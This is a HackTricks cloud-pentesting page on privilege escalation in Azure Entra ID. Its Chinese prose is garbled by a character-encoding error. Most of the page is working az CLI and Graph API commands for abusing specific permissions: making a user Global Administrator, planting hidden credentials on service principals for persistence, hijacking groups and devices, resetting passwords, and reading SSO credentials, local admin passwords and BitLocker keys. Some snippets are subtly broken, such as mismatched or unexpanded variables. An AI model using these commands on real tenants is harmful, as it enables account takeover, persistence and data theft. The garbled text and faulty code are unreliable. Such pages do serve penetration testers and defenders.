# Az - EntraID Privesc

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)** ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

{% hint style="info" %}
è¯·æ³¨æ„ï¼Œ**å¹¶éæ‰€æœ‰çš„ç»†ç²’åº¦æƒé™** å†…ç½®è§’è‰²åœ¨ Entra ID ä¸­ **éƒ½å¯ä»¥ç”¨äºè‡ªå®šä¹‰è§’è‰²ã€‚**
{% endhint %}

## è§’è‰²

### è§’è‰²ï¼šç‰¹æƒè§’è‰²ç®¡ç†å‘˜ <a href="#c9d4cde0-7dcc-45d5-aa95-59d198ae84b2" id="c9d4cde0-7dcc-45d5-aa95-59d198ae84b2"></a>

æ­¤è§’è‰²åŒ…å«å¿…è¦çš„ç»†ç²’åº¦æƒé™ï¼Œä»¥ä¾¿èƒ½å¤Ÿå°†è§’è‰²åˆ†é…ç»™ä¸»ä½“å¹¶ç»™äºˆè§’è‰²æ›´å¤šæƒé™ã€‚è¿™ä¸¤é¡¹æ“ä½œéƒ½å¯èƒ½è¢«æ»¥ç”¨ä»¥æå‡æƒé™ã€‚

* å°†è§’è‰²åˆ†é…ç»™ç”¨æˆ·ï¼š
```bash
# List enabled built-in roles
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/directoryRoles"

# Give role (Global Administrator?) to a user
roleId="<roleId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/directoryRoles/$roleId/members/\$ref" \
--headers "Content-Type=application/json" \
--body "{
\"@odata.id\": \"https://graph.microsoft.com/v1.0/directoryObjects/$userId\"
}"
```
* å‘è§’è‰²æ·»åŠ æ›´å¤šæƒé™ï¼š
```bash
# List only custom roles
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleDefinitions" | jq '.value[] | select(.isBuiltIn == false)'

# Change the permissions of a custom role
az rest --method PATCH \
--uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleDefinitions/<role-id>" \
--headers "Content-Type=application/json" \
--body '{
"description": "Update basic properties of application registrations",
"rolePermissions": [
{
"allowedResourceActions": [
"microsoft.directory/applications/credentials/update"
]
}
]
}'
```
## åº”ç”¨ç¨‹åº

### `microsoft.directory/applications/credentials/update`

è¿™å…è®¸æ”»å‡»è€…**æ·»åŠ å‡­æ®**ï¼ˆå¯†ç æˆ–è¯ä¹¦ï¼‰åˆ°ç°æœ‰åº”ç”¨ç¨‹åºã€‚å¦‚æœè¯¥åº”ç”¨ç¨‹åºå…·æœ‰ç‰¹æƒæƒé™ï¼Œæ”»å‡»è€…å¯ä»¥ä½œä¸ºè¯¥åº”ç”¨ç¨‹åºè¿›è¡Œèº«ä»½éªŒè¯å¹¶è·å¾—è¿™äº›æƒé™ã€‚
```bash
# Generate a new password without overwritting old ones
az ad app credential reset --id <appId> --append
# Generate a new certificate without overwritting old ones
az ad app credential reset --id <appId> --create-cert
```
### `microsoft.directory/applications.myOrganization/credentials/update`

è¿™å…è®¸ä¸ `applications/credentials/update` ç›¸åŒçš„æ“ä½œï¼Œä½†èŒƒå›´ä»…é™äºå•ä¸€ç›®å½•åº”ç”¨ç¨‹åºã€‚
```bash
az ad app credential reset --id <appId> --append
```
### `microsoft.directory/applications/owners/update`

**æè¿°**: æ›´æ–°åº”ç”¨ç¨‹åºçš„æ‰€æœ‰è€…\
**æ»¥ç”¨æ½œåŠ›**: é€šè¿‡å°†è‡ªå·±æ·»åŠ ä¸ºæ‰€æœ‰è€…ï¼Œæ”»å‡»è€…å¯ä»¥æ“æ§åº”ç”¨ç¨‹åºï¼ŒåŒ…æ‹¬å‡­æ®å’Œæƒé™ã€‚
```bash
az ad app owner add --id <AppId> --owner-object-id <UserId>
az ad app credential reset --id <appId> --append

# You can check the owners with
az ad app owner list --id <appId>
```
## Service Principals

### `microsoft.directory/servicePrincipals/credentials/update`

è¿™å…è®¸æ”»å‡»è€…å‘ç°æœ‰æœåŠ¡ä¸»ä½“æ·»åŠ å‡­æ®ã€‚å¦‚æœæœåŠ¡ä¸»ä½“å…·æœ‰æå‡çš„æƒé™ï¼Œæ”»å‡»è€…å¯ä»¥å‡è®¾è¿™äº›æƒé™ã€‚
```bash
az ad sp credential reset --id <sp-id> --append
```
{% hint style="danger" %}
æ–°ç”Ÿæˆçš„å¯†ç ä¸ä¼šå‡ºç°åœ¨ç½‘ç»œæ§åˆ¶å°ä¸­ï¼Œå› æ­¤è¿™å¯èƒ½æ˜¯ä¸€ç§éšç§˜çš„æ–¹å¼æ¥ä¿æŒå¯¹æœåŠ¡ä¸»ä½“çš„æŒä¹…æ€§ã€‚\
å¯ä»¥é€šè¿‡ API æ‰¾åˆ°å®ƒä»¬ï¼š `az ad sp list --query '[?length(keyCredentials) > 0 || length(passwordCredentials) > 0].[displayName, appId, keyCredentials, passwordCredentials]' -o json`
{% endhint %}

å¦‚æœæ‚¨æ”¶åˆ°é”™è¯¯ `"code":"CannotUpdateLockedServicePrincipalProperty","message":"Property passwordCredentials is invalid."`ï¼Œè¿™æ„å‘³ç€ **æ— æ³•ä¿®æ”¹ SP çš„ passwordCredentials å±æ€§**ï¼Œæ‚¨éœ€è¦å…ˆè§£é”å®ƒã€‚ä¸ºæ­¤ï¼Œæ‚¨éœ€è¦ä¸€ä¸ªæƒé™ (`microsoft.directory/applications/allProperties/update`)ï¼Œå…è®¸æ‚¨æ‰§è¡Œï¼š

{% code overflow="wrap" %}
```bash
az rest --method PATCH --url https://graph.microsoft.com/v1.0/applications/<sp-object-id> --body '{"servicePrincipalLockConfiguration": null}'
```
{% endcode %}

### `microsoft.directory/servicePrincipals/synchronizationCredentials/manage`

è¿™å…è®¸æ”»å‡»è€…å‘ç°æœ‰æœåŠ¡ä¸»ä½“æ·»åŠ å‡­æ®ã€‚å¦‚æœæœåŠ¡ä¸»ä½“å…·æœ‰æå‡çš„æƒé™ï¼Œæ”»å‡»è€…å¯ä»¥å‡è®¾è¿™äº›æƒé™ã€‚
```bash
az ad sp credential reset --id <sp-id> --append
```
### `microsoft.directory/servicePrincipals/owners/update`

ä¸åº”ç”¨ç¨‹åºç±»ä¼¼ï¼Œæ‹¥æœ‰æœåŠ¡ä¸»ä½“å¯ä»¥æ§åˆ¶å…¶å‡­æ®å’Œæƒé™ã€‚
```bash
# Add new owner
spId="<spId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/servicePrincipals/$spId/owners/\$ref" \
--headers "Content-Type=application/json" \
--body "{
\"@odata.id\": \"https://graph.microsoft.com/v1.0/directoryObjects/$userId\"
}"

az ad sp credential reset --id <sp-id> --append

# You can check the owners with
az ad sp owner list --id <spId>
```
{% hint style="danger" %}
åœ¨æ·»åŠ æ–°æ‰€æœ‰è€…åï¼Œæˆ‘å°è¯•å°†å…¶åˆ é™¤ï¼Œä½†APIå“åº”è¯´ä¸æ”¯æŒDELETEæ–¹æ³•ï¼Œå³ä½¿è¿™æ˜¯åˆ é™¤æ‰€æœ‰è€…æ‰€éœ€ä½¿ç”¨çš„æ–¹æ³•ã€‚å› æ­¤ï¼Œ**ç°åœ¨æ— æ³•åˆ é™¤æ‰€æœ‰è€…**ã€‚
{% endhint %}

### `microsoft.directory/servicePrincipals/disable` å’Œ `enable`

è¿™äº›æƒé™å…è®¸ç¦ç”¨å’Œå¯ç”¨æœåŠ¡ä¸»ä½“ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æƒé™å¯ç”¨ä»–ä»¥æŸç§æ–¹å¼è·å¾—è®¿é—®æƒé™çš„æœåŠ¡ä¸»ä½“ï¼Œä»¥æå‡æƒé™ã€‚

è¯·æ³¨æ„ï¼Œå¯¹äºæ­¤æŠ€æœ¯ï¼Œæ”»å‡»è€…éœ€è¦æ›´å¤šæƒé™æ‰èƒ½æ¥ç®¡å·²å¯ç”¨çš„æœåŠ¡ä¸»ä½“ã€‚
```bash
bashCopy code# Disable
az ad sp update --id <ServicePrincipalId> --account-enabled false

# Enable
az ad sp update --id <ServicePrincipalId> --account-enabled true
```
#### `microsoft.directory/servicePrincipals/getPasswordSingleSignOnCredentials` & `microsoft.directory/servicePrincipals/managePasswordSingleSignOnCredentials`

è¿™äº›æƒé™å…è®¸åˆ›å»ºå’Œè·å–å•ç‚¹ç™»å½•çš„å‡­æ®ï¼Œè¿™å¯èƒ½å…è®¸è®¿é—®ç¬¬ä¸‰æ–¹åº”ç”¨ç¨‹åºã€‚

{% code overflow="wrap" %}
```bash
# Generate SSO creds for a user or a group
spID="<spId>"
user_or_group_id="<id>"
username="<username>"
password="<password>"
az rest --method POST \
--uri "https://graph.microsoft.com/beta/servicePrincipals/$spID/createPasswordSingleSignOnCredentials" \
--headers "Content-Type=application/json" \
--body "{\"id\": \"$user_or_group_id\", \"credentials\": [{\"fieldId\": \"param_username\", \"value\": \"$username\", \"type\": \"username\"}, {\"fieldId\": \"param_password\", \"value\": \"$password\", \"type\": \"password\"}]}"


# Get credentials of a specific credID
credID="<credID>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/servicePrincipals/$credID/getPasswordSingleSignOnCredentials" \
--headers "Content-Type=application/json" \
--body "{\"id\": \"$credID\"}"
```
{% endcode %}

***

## ç»„

### `microsoft.directory/groups/allProperties/update`

æ­¤æƒé™å…è®¸å°†ç”¨æˆ·æ·»åŠ åˆ°ç‰¹æƒç»„ï¼Œä»è€Œå¯¼è‡´æƒé™æå‡ã€‚
```bash
az ad group member add --group <GroupName> --member-id <UserId>
```
**æ³¨æ„**: æ­¤æƒé™ä¸åŒ…æ‹¬ Entra ID è§’è‰²å¯åˆ†é…ç»„ã€‚

### `microsoft.directory/groups/owners/update`

æ­¤æƒé™å…è®¸æˆä¸ºç»„çš„æ‰€æœ‰è€…ã€‚ç»„çš„æ‰€æœ‰è€…å¯ä»¥æ§åˆ¶ç»„æˆå‘˜èµ„æ ¼å’Œè®¾ç½®ï¼Œå¯èƒ½ä¼šæå‡ç»„çš„æƒé™ã€‚
```bash
az ad group owner add --group <GroupName> --owner-object-id <UserId>
az ad group member add --group <GroupName> --member-id <UserId>
```
**æ³¨æ„**: æ­¤æƒé™ä¸åŒ…æ‹¬ Entra ID è§’è‰²å¯åˆ†é…ç»„ã€‚

### `microsoft.directory/groups/members/update`

æ­¤æƒé™å…è®¸å‘ç»„ä¸­æ·»åŠ æˆå‘˜ã€‚æ”»å‡»è€…å¯ä»¥å°†è‡ªå·±æˆ–æ¶æ„è´¦æˆ·æ·»åŠ åˆ°ç‰¹æƒç»„ä¸­ï¼Œä»è€Œè·å¾—æå‡çš„è®¿é—®æƒé™ã€‚
```bash
az ad group member add --group <GroupName> --member-id <UserId>
```
### `microsoft.directory/groups/dynamicMembershipRule/update`

æ­¤æƒé™å…è®¸æ›´æ–°åŠ¨æ€ç»„ä¸­çš„æˆå‘˜è§„åˆ™ã€‚æ”»å‡»è€…å¯ä»¥ä¿®æ”¹åŠ¨æ€è§„åˆ™ï¼Œä»¥åœ¨æ²¡æœ‰æ˜ç¡®æ·»åŠ çš„æƒ…å†µä¸‹å°†è‡ªå·±åŒ…å«åœ¨ç‰¹æƒç»„ä¸­ã€‚
```bash
groupId="<group-id>"
az rest --method PATCH \
--uri "https://graph.microsoft.com/v1.0/groups/$groupId" \
--headers "Content-Type=application/json" \
--body '{
"membershipRule": "(user.otherMails -any (_ -contains \"security\")) -and (user.userType -eq \"guest\")",
"membershipRuleProcessingState": "On"
}'
```
**æ³¨æ„**: æ­¤æƒé™ä¸åŒ…æ‹¬ Entra ID è§’è‰²å¯åˆ†é…ç»„ã€‚

### åŠ¨æ€ç»„æƒé™æå‡

ç”¨æˆ·å¯èƒ½é€šè¿‡ä¿®æ”¹è‡ªå·±çš„å±æ€§æ¥æå‡æƒé™ï¼Œä»¥ä¾¿è¢«æ·»åŠ ä¸ºåŠ¨æ€ç»„çš„æˆå‘˜ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="dynamic-groups.md" %}
[dynamic-groups.md](dynamic-groups.md)
{% endcontent-ref %}

## ç”¨æˆ·

### `microsoft.directory/users/password/update`

æ­¤æƒé™å…è®¸é‡ç½®éç®¡ç†å‘˜ç”¨æˆ·çš„å¯†ç ï¼Œä»è€Œå…è®¸æ½œåœ¨æ”»å‡»è€…æå‡å¯¹å…¶ä»–ç”¨æˆ·çš„æƒé™ã€‚
```bash
az ad user update --id <user-id> --password "kweoifuh.234"
```
### `microsoft.directory/users/basic/update`

æ­¤æƒé™å…è®¸ä¿®æ”¹ç”¨æˆ·çš„å±æ€§ã€‚é€šå¸¸å¯ä»¥æ‰¾åˆ°æ ¹æ®å±æ€§å€¼æ·»åŠ ç”¨æˆ·çš„åŠ¨æ€ç»„ï¼Œå› æ­¤ï¼Œæ­¤æƒé™å¯èƒ½å…è®¸ç”¨æˆ·è®¾ç½®æ‰€éœ€çš„å±æ€§å€¼ï¼Œä»¥æˆä¸ºç‰¹å®šåŠ¨æ€ç»„çš„æˆå‘˜å¹¶æå‡æƒé™ã€‚

{% code overflow="wrap" %}
```bash
#e.g. change manager of a user
victimUser="<userID>"
managerUser="<userID>"
az rest --method PUT \
--uri "https://graph.microsoft.com/v1.0/users/$managerUser/manager/\$ref" \
--headers "Content-Type=application/json" \
--body '{"@odata.id": "https://graph.microsoft.com/v1.0/users/$managerUser"}'

#e.g. change department of a user
az rest --method PATCH \
--uri "https://graph.microsoft.com/v1.0/users/$victimUser" \
--headers "Content-Type=application/json" \
--body "{\"department\": \"security\"}"
```
{% endcode %}

## æ¡ä»¶è®¿é—®ç­–ç•¥ä¸ MFA ç»•è¿‡

é…ç½®é”™è¯¯çš„æ¡ä»¶è®¿é—®ç­–ç•¥è¦æ±‚ MFA å¯èƒ½ä¼šè¢«ç»•è¿‡ï¼Œè¯·æ£€æŸ¥ï¼š

{% content-ref url="az-conditional-access-policies-mfa-bypass.md" %}
[az-conditional-access-policies-mfa-bypass.md](az-conditional-access-policies-mfa-bypass.md)
{% endcontent-ref %}

## è®¾å¤‡

### `microsoft.directory/devices/registeredOwners/update`

æ­¤æƒé™å…è®¸æ”»å‡»è€…å°†è‡ªå·±æŒ‡å®šä¸ºè®¾å¤‡çš„æ‰€æœ‰è€…ï¼Œä»¥è·å¾—å¯¹è®¾å¤‡ç‰¹å®šè®¾ç½®å’Œæ•°æ®çš„æ§åˆ¶æˆ–è®¿é—®ã€‚
```bash
deviceId="<deviceId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/devices/$deviceId/owners/\$ref" \
--headers "Content-Type=application/json" \
--body '{"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/$userId"}'
```
### `microsoft.directory/devices/registeredUsers/update`

æ­¤æƒé™å…è®¸æ”»å‡»è€…å°†å…¶å¸æˆ·ä¸è®¾å¤‡å…³è”ï¼Œä»¥è·å¾—è®¿é—®æƒé™æˆ–ç»•è¿‡å®‰å…¨ç­–ç•¥ã€‚
```bash
deviceId="<deviceId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/devices/$deviceId/registeredUsers/\$ref" \
--headers "Content-Type=application/json" \
--body '{"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/$userId"}'
```
### `microsoft.directory/deviceLocalCredentials/password/read`

æ­¤æƒé™å…è®¸æ”»å‡»è€…è¯»å– Microsoft Entra åŠ å…¥è®¾å¤‡çš„å¤‡ä»½æœ¬åœ°ç®¡ç†å‘˜å¸æˆ·å‡­æ®çš„å±æ€§ï¼ŒåŒ…æ‹¬å¯†ç 

{% code overflow="wrap" %}
```bash
# List deviceLocalCredentials
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/directory/deviceLocalCredentials"

# Get credentials
deviceLC="<deviceLCID>"
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/directory/deviceLocalCredentials/$deviceLCID?\$select=credentials" \
```
{% endcode %}

## BitlockerKeys

### `microsoft.directory/bitlockerKeys/key/read`

æ­¤æƒé™å…è®¸è®¿é—® BitLocker å¯†é’¥ï¼Œè¿™å¯èƒ½ä½¿æ”»å‡»è€…èƒ½å¤Ÿè§£å¯†é©±åŠ¨å™¨ï¼Œä»è€Œå±åŠæ•°æ®æœºå¯†æ€§ã€‚

{% code overflow="wrap" %}
```bash
# List recovery keys
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/informationProtection/bitlocker/recoveryKeys"

# Get key
recoveryKeyId="<recoveryKeyId>"
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/informationProtection/bitlocker/recoveryKeys/$recoveryKeyId?\$select=key"
```
{% endcode %}

## å…¶ä»–æœ‰è¶£çš„æƒé™ (TODO)

* `microsoft.directory/applications/permissions/update`
* `microsoft.directory/servicePrincipals/permissions/update`
* `microsoft.directory/applications.myOrganization/allProperties/update`
* `microsoft.directory/applications/allProperties/update`
* `microsoft.directory/servicePrincipals/appRoleAssignedTo/update`
* `microsoft.directory/applications/appRoles/update`
* `microsoft.directory/applications.myOrganization/permissions/update`

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ **ä¸Šå…³æ³¨æˆ‘ä»¬** [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
